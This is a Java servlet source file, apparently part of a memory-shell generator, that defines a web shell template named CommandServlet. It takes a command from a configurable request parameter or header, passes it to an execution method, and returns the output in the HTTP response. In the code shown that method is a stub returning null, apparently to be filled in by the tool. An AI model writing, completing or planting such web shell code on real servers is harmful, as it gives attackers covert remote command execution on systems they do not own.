package com.reajason.javaweb.memshell.shelltool.command;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2024/12/15
 */
public class CommandServlet extends HttpServlet {
    private static String paramName;

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            String p = request.getParameter(paramName);
            if (p == null || p.isEmpty()) {
                p = request.getHeader(paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
